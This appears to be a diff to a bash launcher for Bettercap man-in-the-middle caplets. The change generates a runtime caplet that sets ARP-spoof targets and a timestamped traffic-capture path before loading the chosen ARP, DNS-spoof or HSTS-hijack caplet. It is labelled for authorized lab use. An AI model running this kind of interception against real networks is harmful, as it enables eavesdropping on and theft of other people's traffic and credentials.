@@ -2,7 +2,7 @@
 # bettercap_mitm.sh
 # Last Edited by Charles Duoto on November 17, 2026
 # Launcher for Bettercap MITM caplets.
-# Choose ARP-only, ARP+DNS spoof, or ARP+HSTS hijack.
+# Generates a timestamped capture file and injects the path before loading the chosen caplet.
 # Pure bash. Authorized lab environments only.
 #
 # Usage:
@@ -51,20 +51,32 @@ if [[ ! -f "$CAPLET" ]]; then
     exit 1
 fi
 
+# Timestamped capture file
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+CAPTURE="/root/Vibe_Coded_Scripts/HaxVibez/capture_${TIMESTAMP}.cap"
+
+# Build a runtime caplet that sets the path first, then includes the chosen one
+RUNTIME_CAP=$(mktemp /tmp/bettercap_runtime_XXXXXX.cap)
+{
+    echo "# runtime caplet generated $(date)"
+    echo "set arp.spoof.targets $TARGET"
+    echo "set net.sniff.output $CAPTURE"
+    echo
+    cat "$CAPLET"
+} > "$RUNTIME_CAP"
+
 echo
 echo "[*] Interface : $IFACE"
 echo "[*] Target    : $TARGET"
 echo "[*] Caplet    : $CAPLET"
-
-# Timestamped capture file
-TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-CAPTURE="/root/Vibe_Coded_Scripts/HaxVibez/capture_${TIMESTAMP}.cap"
 echo "[*] Capture   : $CAPTURE"
+echo "[*] Runtime   : $RUNTIME_CAP"
 echo
 echo "[*] Starting Bettercap..."
 echo "[*] Type 'exit' or Ctrl+C to stop."
 echo
 
-bettercap -iface "$IFACE" \
-  -eval "set arp.spoof.targets $TARGET; set net.sniff.output $CAPTURE" \
-  -caplet "$CAPLET"
+# Clean up runtime caplet on exit
+trap 'rm -f "$RUNTIME_CAP"' EXIT
+
+bettercap -iface "$IFACE" -caplet "$RUNTIME_CAP"
